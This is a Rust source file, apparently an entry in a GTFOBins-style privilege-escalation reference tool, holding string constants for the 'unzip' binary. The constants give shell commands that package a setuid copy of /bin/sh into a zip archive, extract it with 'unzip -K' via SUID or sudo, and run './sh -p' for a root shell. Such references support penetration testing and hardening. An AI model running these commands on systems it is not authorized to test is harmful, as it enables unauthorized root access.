pub static BIN_NAME: &'static str = "unzip";
pub static BIN_DESC_1: &'static str = "Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:";
pub static BIN_CODE_1: &'static str = r#"
    
    cp /bin/sh .
    chmod +s sh
    zip shell.zip sh
"#;
pub static BIN_DESC_2: &'static str = "Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which unzip) .

    ./unzip -K shell.zip
    ./sh -p
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo unzip -K shell.zip
    ./sh -p
"#;
use crate::code::{Code, Tag};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
